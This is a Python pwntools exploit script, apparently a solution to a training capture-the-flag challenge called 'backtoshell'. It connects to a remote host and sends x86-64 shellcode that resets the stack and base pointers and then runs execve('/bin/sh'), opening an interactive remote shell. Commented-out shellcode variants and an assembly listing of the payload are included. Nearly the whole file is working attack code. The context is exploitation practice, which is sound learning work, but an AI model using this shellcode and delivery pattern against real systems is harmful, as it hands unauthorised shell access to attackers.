from pwn import *


#context.terminal = ['tmux', 'splitw', '-h']


#r = process("./backtoshell")
r = remote("bin.training.jinblack.it", 3001)


#gdb.attach(r, """
#	#b*0x7ffff7ffa000
#	brva 0x113a
#	c
#	""")

#input("wait")



#reset stack pointer and base pointer to their original values
#0x7fffffffdf28
#0x7fffffffdf38
#But works only in local :/
#shellcode = b"\x48\xBC\x28\xDF\xFF\xFF\xFF\x7F\x00\x00\x48\xBD\x38\xDF\xFF\xFF\xFF\x7F\x00\x00"

#Alternative solution
#nop
#mov rbp, rax
#add rbp, 200
#mov rsp, rax
#add rsp, 200
shellcode = b"\x90\x48\x89\xC5\x48\x81\xC5\xC8\x00\x00\x00\x48\x89\xC4\x48\x81\xC4\xC8\x00\x00\x00"


shellcode += b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00"

#shellcode += b"\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\x6A\x3B\x58\x99\x0F\x05"

payload = shellcode.ljust(512, b"\x90")

r.send(payload)

r.interactive()


#Code of the binary shellcode
# jmp binsh
# back:
# pop rdi
# mov rsi, rdi
# add rsi, 8
# mov rdx, rsi
# mov rax, 0x3b
# syscall
#
# binsh:
# call back
# nop
# nop